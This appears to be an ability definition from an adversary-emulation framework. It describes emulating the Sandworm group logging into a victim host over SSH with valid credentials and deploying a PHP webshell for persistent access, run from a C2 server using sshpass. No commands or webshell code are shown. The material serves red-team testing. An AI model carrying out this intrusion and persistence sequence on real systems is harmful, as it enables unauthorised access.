name: Sandworm Initial Compromise - Transfer Webshell
description: Sandworm logs into patient zero via SSH using Valid Accounts. It is unknown how Sandworm obtained the credentials (perhaps an SSH password guessing attack, or zero day exploit). Sandworm then deploys a PHP webshell for persistent access. This ability must be run by an agent running on the attacker-controlled machine (e.g. on the C2 server itself), since it will target patient zero. Requires sshpass to be installed on attacker-controlled machine (sudo apt install sshpass).
